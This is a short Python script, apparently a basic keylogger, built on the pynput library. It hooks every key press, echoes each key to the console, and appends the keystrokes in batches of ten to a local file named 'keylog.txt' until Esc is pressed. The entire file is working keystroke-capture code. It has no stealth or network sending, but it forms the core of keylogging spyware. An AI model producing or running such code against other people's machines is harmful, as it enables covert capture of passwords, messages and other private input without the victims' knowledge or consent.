from pynput import keyboard

# List to store keystrokes
keys = []

# Function that will be called whenever the key is pressed
def key_press(key):
    try:
        print(f'Key {key.char} pressed')
        keys.append(key.char)
    except AttributeError:
        print(f'Special key {key} pressed')
        keys.append(f'[{key}]')

    if len(keys) >= 10:
        write_to_file(keys)
        keys.clear()

# Function that will be called whenever a key is released
def key_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Write the keystrokes to a log file
def write_to_file(keys):
    with open("keylog.txt", 'a') as f:
        for key in keys:
            f.write(str(key))
        f.write("\n")

# Set up the listener
with keyboard.Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()